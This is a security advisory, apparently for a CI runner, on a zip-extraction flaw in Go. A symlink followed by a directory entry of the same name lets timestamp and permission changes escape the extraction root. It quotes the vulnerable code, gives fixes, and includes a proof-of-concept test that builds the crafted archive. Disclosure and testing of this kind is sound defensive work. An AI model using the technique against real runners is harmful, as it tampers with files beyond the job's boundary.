### Title
Symlink-following in `os.Chtimes`/`Fchmodat` during zip extraction lets duplicate-named directory entries modify timestamps/permissions of files outside the extraction root - ([File: helpers/archives/zip_extract.go], [File: helpers/archives/zip_extra.go], [File: helpers/archives/os_unix.go])

### Summary
`ExtractZipArchive`'s two-pass design processes the same `archive.File` slice twice, once to create filesystem entries and once to apply `lchmod`/`processZipExtra` (Lchown/Chtimes) by `file.Name`. Because a duplicate-named directory entry after a symlink entry silently no-ops in pass one (Mkdir returns `EEXIST`, which is swallowed), the on-disk object remains the attacker-planted symlink, and pass two's `os.Chtimes` (and, on Linux, `unix.Fchmodat` without `AT_SYMLINK_NOFOLLOW`) then follow that symlink to whatever target the attacker chose.

### Finding Description
The exploit uses two zip entries with the identical `Name` field ("link"):

1. Entry A: type symlink, target = an absolute path outside the extraction root (e.g. `/etc/passwd` or any file the runner user can access).
2. Entry B: type directory (or another non-removed type), same name "link", carrying a `ZipTimestampFieldType` (and optionally `ZipUIDGidFieldType`) extra field.

Pass one (`extractZipFile`, called from `ExtractZipArchive` at [1](#0-0) ):
- For entry A, `extractZipSymlinkEntry` removes any existing path and creates the symlink [2](#0-1) .
- For entry B (directory), `extractZipDirectoryEntry` calls `os.Mkdir`; since "link" already exists (as the symlink), `Mkdir` fails with `EEXIST`, which is explicitly treated as "not an error" and swallowed [3](#0-2) . The symlink is never removed, unlike the file/symlink extraction paths which call `os.Remove` first.

Pass two ( [4](#0-3) ) iterates the same list again:
- For entry B, `lchmod(file.Name, file.Mode())` is invoked. On Linux, the function only skips symlink-mode entries; since entry B's header mode is `Dir`, it calls `unix.Fchmodat` with `flags = 0` (no `AT_SYMLINK_NOFOLLOW`), which follows the symlink and chmods the outside target [5](#0-4) .
- `processZipExtra(&file.FileHeader)` then runs `processZipTimestampField`, which only guards against symlink-mode headers (`!file.Mode().IsDir() && !file.Mode().IsRegular()`), so it proceeds because entry B's header says `Dir`, and calls `os.Chtimes(file.Name, ...)` [6](#0-5) . `os.Chtimes` follows symlinks by design, so it changes the modification time of whatever file the attacker's symlink points to, not of anything inside the extraction root.

This differs from `os.Lchown`, used for the UID/GID extra field [7](#0-6) , which correctly operates on the link itself and is not exploitable this way. There is no path-containment check (e.g., verifying the resolved real path stays under the extraction root) anywhere in this extraction code; the only existing guard, `errorIfGitDirectory`, only blocks `.git` paths [8](#0-7) .

### Impact Explanation
An attacker who controls artifact/cache zip contents for a job (a normal, unprivileged capability) can cause the Runner extraction process to modify the mtime/atime and, on Linux, the permission bits of any file the Runner process's user can reach via a symlink target — not merely content inside the job's own extraction root, violating the invariant that archive extraction must stay within the intended build/cache/artifact root. This is a metadata-only attack (no content overwrite: `extractZipFileEntry`/`extractZipSymlinkEntry` both call `os.Remove` before creating, which converts the symlink into a real object inside the extraction root and prevents content injection), but altering permissions/timestamps of files outside the workspace (e.g., another job's cached files, shared runner state files) is a real cross-boundary side effect.

### Likelihood Explanation
Reachable purely by supplying a crafted zip as a job artifact or cache archive — no special privileges beyond being a pipeline author who controls archive contents needed. Duplicate-name zip entries are valid in the ZIP format and parsed as-is by Go's `archive/zip`, and `ExtractZipArchive` iterates `archive.File` (which preserves duplicates) twice without deduplication. The bug is deterministic given the two crafted entries and does not depend on timing/races (despite being framed as TOCTOU, it's a deterministic ordering bug, not a race), making it fully repeatable.

### Recommendation
- Before applying `lchmod`/`Lchown`/`Chtimes` in the second pass, `os.Lstat` the target path and skip (or use `AT_SYMLINK_NOFOLLOW`/refuse) if it is a symlink whose header type in this iteration does not match, or simply always operate with `AT_SYMLINK_NOFOLLOW` for `Fchmodat` regardless of the header's claimed mode.
- Use a symlink-safe alternative to `os.Chtimes` (e.g., `unix.UtimesNanoAt` with `AT_SYMLINK_NOFOLLOW`) for the timestamp field, mirroring the `Lchown` behavior.
- Reject/overwrite duplicate-named entries in the archive up front (dedupe by `file.Name`, keep last-wins semantics with explicit removal of any prior filesystem object, including symlinks) instead of silently swallowing `EEXIST` in `extractZipDirectoryEntry`.
- Validate that the resolved (`filepath.EvalSymlinks`) real path of every entry stays within the extraction root before performing any second-pass metadata operation.

### Proof of Concept
Go test in `helpers/archives/zip_extract_test.go`:
```go
func TestExtractZipArchive_DuplicateNameSymlinkEscapesChtimes(t *testing.T) {
    testInWorkDir(t, func(t *testing.T, fileName string) {
        outside := filepath.Join(t.TempDir(), "victim.txt")
        require.NoError(t, os.WriteFile(outside, []byte("x"), 0o644))
        originalTime := time.Now().Add(-72 * time.Hour)
        require.NoError(t, os.Chtimes(outside, originalTime, originalTime))

        f, err := os.Create(fileName)
        require.NoError(t, err)
        defer f.Close()

        zw := zip.NewWriter(f)
        // Entry A: symlink "link" -> outside
        sh := &zip.FileHeader{Name: "link"}
        sh.SetMode(os.ModeSymlink | 0o777)
        w, _ := zw.CreateHeader(sh)
        _, _ = w.Write([]byte(outside))

        // Entry B: directory "link" with timestamp extra field
        dh := &zip.FileHeader{Name: "link"}
        dh.SetMode(os.ModeDir | 0o755)
        var buf bytes.Buffer
        ts := ZipTimestampField{Flags: 1, ModTime: uint32(time.Now().Unix())}
        tsType := ZipExtraField{Type: ZipTimestampFieldType, Size: uint16(binary.Size(&ts))}
        binary.Write(&buf, binary.LittleEndian, &tsType)
        binary.Write(&buf, binary.LittleEndian, &ts)
        dh.Extra = buf.Bytes()
        _, _ = zw.CreateHeader(dh)
        zw.Close()

        err = ExtractZipFile(fileName)
        require.NoError(t, err)

        // Assert: symlink still points outside (not overwritten)
        lstat, err := os.Lstat("link")
        require.NoError(t, err)
        assert.True(t, lstat.Mode()&os.ModeSymlink != 0, "expected 'link' to remain a symlink")

        // Assert: outside victim mtime was changed via symlink dereference (BUG)
        info, err := os.Stat(outside)
        require.NoError(t, err)
        assert.NotEqual(t, originalTime.Unix(), info.ModTime().Unix(),
            "victim file outside extraction root should NOT have its mtime changed")
    })
}
```
Expected (fixed) behavior: the assertion on `outside`'s mtime staying unchanged should pass. On the current code, it fails, proving `os.Chtimes` dereferenced the symlink and modified a file outside the extraction root.

### Citations

**File:** helpers/archives/zip_extract.go (L12-20)
```go
func extractZipDirectoryEntry(file *zip.File) (err error) {
	err = os.Mkdir(file.Name, file.Mode().Perm())

	// The "directory does exist" error is not an error for us
	if os.IsExist(err) {
		err = nil
	}
	return
}
```

**File:** helpers/archives/zip_extract.go (L22-39)
```go
func extractZipSymlinkEntry(file *zip.File) (err error) {
	var data []byte
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	data, err = io.ReadAll(in)
	if err != nil {
		return err
	}

	// Remove symlink before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	err = os.Symlink(string(data), file.Name)
	return
}
```

**File:** helpers/archives/zip_extract.go (L88-96)
```go
	for _, file := range archive.File {
		if err := errorIfGitDirectory(file.Name); tracker.actionable(err) {
			printGitArchiveWarning("extract")
		}

		if err := extractZipFile(file); tracker.actionable(err) {
			logrus.Warningf("%s: %s (suppressing repeats)", file.Name, err)
		}
	}
```

**File:** helpers/archives/zip_extract.go (L98-107)
```go
	for _, file := range archive.File {
		if err := lchmod(file.Name, file.Mode()); tracker.actionable(err) {
			logrus.Warningf("%s: %s (suppressing repeats)", file.Name, err)
		}

		// Process zip metadata
		if err := processZipExtra(&file.FileHeader); tracker.actionable(err) {
			logrus.Warningf("%s: %s (suppressing repeats)", file.Name, err)
		}
	}
```

**File:** helpers/archives/os_unix.go (L12-28)
```go
func lchmod(name string, mode os.FileMode) error {
	var flags int

	if runtime.GOOS == "linux" {
		// Linux does not support changing modes on symlinks.
		if mode&os.ModeSymlink != 0 {
			return nil
		}
	} else {
		flags = unix.AT_SYMLINK_NOFOLLOW
	}

	err := unix.Fchmodat(unix.AT_FDCWD, name, uint32(mode.Perm()), flags)
	if err != nil {
		return &os.PathError{Op: "lchmod", Path: name, Err: err}
	}
	return nil
```

**File:** helpers/archives/zip_extra.go (L50-68)
```go
func processZipTimestampField(data []byte, file *zip.FileHeader) error {
	if !file.Mode().IsDir() && !file.Mode().IsRegular() {
		return nil
	}

	var tsField ZipTimestampField
	err := binary.Read(bytes.NewReader(data), binary.LittleEndian, &tsField)
	if err != nil {
		return err
	}

	if (tsField.Flags & 1) == 1 {
		modTime := time.Unix(int64(tsField.ModTime), 0)
		acTime := time.Now()
		return os.Chtimes(file.Name, acTime, modTime)
	}

	return nil
}
```

**File:** helpers/archives/zip_extra_unix.go (L37-48)
```go
func processZipUIDGidField(data []byte, file *zip.FileHeader) error {
	var ugField ZipUIDGidField
	err := binary.Read(bytes.NewReader(data), binary.LittleEndian, &ugField)
	if err != nil {
		return err
	}

	if !(ugField.Version == 1 && ugField.UIDSize == 4 && ugField.GIDSize == 4) {
		return errors.New("uid/gid data not supported")
	}

	return os.Lchown(file.Name, int(ugField.UID), int(ugField.Gid))
```

**File:** helpers/archives/path_check_helper.go (L13-19)
```go
func isPathAGitDirectory(path string) bool {
	parts := strings.Split(filepath.Clean(path), string(filepath.Separator))
	if len(parts) > 0 && parts[0] == ".git" {
		return true
	}
	return false
}
```
